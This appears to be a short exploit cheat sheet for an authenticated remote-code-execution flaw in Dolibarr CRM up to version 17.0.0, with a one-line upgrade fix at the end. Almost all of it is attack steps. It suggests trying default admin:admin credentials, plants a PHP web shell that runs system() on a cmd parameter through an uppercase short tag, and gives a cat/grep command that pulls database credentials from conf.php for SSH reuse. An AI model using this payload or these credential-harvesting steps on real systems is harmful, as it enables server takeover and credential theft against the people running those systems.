# Dolibarr CRM PHP Short Tag RCE (≤17.0.0)

Authenticated users with website module edit permissions can inject PHP via the `<?PHP` short tag, bypassing the filter that only blocks `<?php` and `<?=`.

## Steps

```
1. Log in to Dolibarr (default admin:admin often works)
2. Websites module → New website → Create a page
3. Edit HTML Source of the page → inject PHP using uppercase tag:
```

```php
<?PHP system($_GET['cmd']); ?>
```

```
4. Access the page at http://<TARGET>/public/website/<site>/<alias>.php?cmd=id
```

## Via conf.php credential reuse

```bash
# After RCE as www-data, read Dolibarr's database config:
cat /var/www/html/dolibarr/conf/conf.php | grep -E 'dolibarr_main_(db|user|pass)'
# Credential fields: dolibarr_main_db_user, dolibarr_main_db_pass
# Try reusing these credentials for system user SSH login
```

Fix: upgrade to 17.0.1+.
